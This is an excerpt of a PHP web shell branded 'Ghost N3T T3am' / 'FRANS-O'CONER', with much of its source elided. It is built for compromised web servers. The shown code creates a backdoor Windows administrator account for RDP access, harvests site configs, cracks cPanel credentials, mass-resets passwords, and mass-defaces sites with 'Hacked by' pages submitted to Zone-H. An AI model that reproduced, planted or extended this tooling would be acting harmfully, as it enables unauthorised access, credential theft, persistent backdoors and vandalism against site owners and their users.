...
<!DOCTYPE HTML>
<html>
<head><link rel="icon" type="image/gif" href="https://i.ibb.co/Ksh9LgP/images-1.jpg">
...
+--- ./Mr.Cyber
 ...
 .d8888b. 888                     888     888b    888 .d8888b.88888888888  88888888888.d8888b.                       
d88P  Y88b888                     888     8888b   888d88P  Y88b   888         888   d88P  Y88b                      
888    888888                     888     88888b  888     .d88P   888         888        .d88P                      
888       88888b.  .d88b. .d8888b 888888  888Y88b 888    8888"    888         888       8888"  8888b. 88888b.d88b.  
888  88888888 "88bd88""88b88K     888     888 Y88b888     "Y8b.   888         888        "Y8b.    "88b888 "888 "88b 
888    888888  88 88     8"Y8888b.888     888  Y888888     888    888         888   888    888.d888888888  888  888 
Y88b  d88P888  888Y88..88P     X88Y88b.   888   Y8888Y88b  d88P   888         888   Y88b  d88P888  888888  888  888 
 "Y8888P88888  888 "Y88P"  88888P' "Y888  888    Y888 "Y8888P"    888         888    "Y8888P" "Y888888888  888  888 
	</pre>
</header>
<form method="post">
...
-->
<head>
<title>FRANS-O'CONER</title>

<meta name='author' content='Ghost N3T T3am'>
<meta charset="UTF-8">
<style type='text/css'>
...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/Ghost N3T T3am/", exe("net user"))) die(color(1, 1, "[INFO] username 'Ghost N3T T3am' already exists."));

		$add_user   = exe("net user Ghost N3T T3am Ghost N3T T3am /add");
    	$add_groups1 = exe("net localgroup Administrators Ghost N3T T3am /add");
    	$add_groups2 = exe("net localgroup Administrator Ghost N3T T3am /add");
    	$add_groups3 = exe("net localgroup Administrateur Ghost N3T T3am /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "Ghost N3T T3am")."<br>
    	Password: ".color(1, 2, "Ghost N3T T3am")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='https://www.youtube.com/channel/UCyZpRlHeVnu002b2FKJ7Kqg/' target='_blank'>".color(1, 2, "Ghost N3T T3am")."</a></center>";
}
	...
	if(isset($_GET['do'])) {
		...
		elseif($_GET['do'] === "config") {
			...
			if(!is_dir(path()."/idx_config/")) {
				...
				$htaccess = "Options all\nDirectoryIndex Ghost N3T T3am.htm\nSatisfy Any";
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='Ghost N3T T3am'><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by Ghost N3T T3am")."</p>";
			} else {
				print "<center>
		...
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
				...
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='Ghost N3T T3am' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='Ghost N3T T3am' placeholder='pass_baru'><br>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by FRANS-O'CONER</textarea><br>
